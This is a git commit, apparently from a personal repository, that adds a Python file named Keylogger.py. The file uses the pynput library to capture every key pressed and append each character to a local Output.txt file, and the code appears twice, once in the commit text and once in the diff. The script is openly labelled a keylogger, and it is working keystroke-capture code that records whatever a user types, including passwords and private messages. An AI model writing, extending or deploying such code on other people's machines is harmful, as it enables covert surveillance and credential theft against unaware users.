75ae7257f3a6a6a2f9328bb1c792af3cd4c00ea5
Jonathan <bjjepic@gmail.com>
2025-08-28 20:53:33 +0100

    from pynput import keyboard
    def keyPressed(key):
        print(str(key))
        with open("Output.txt", 'a') as LogKey:
            try:
                char = key.char
                LogKey.write(char)
            except:
                    print("Error: Character Fetch Failure")
    
    if __name__ == "__main__":
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input()
    
    print("Keylogger started...")

---
+++ Keylogger.py
@@ -0,0 +1,19 @@
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("Output.txt", 'a') as LogKey:
+        try:
+            char = key.char
+            LogKey.write(char)
+        except:
+                print("Error: Character Fetch Failure")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
+print("Keylogger started...")
+
+
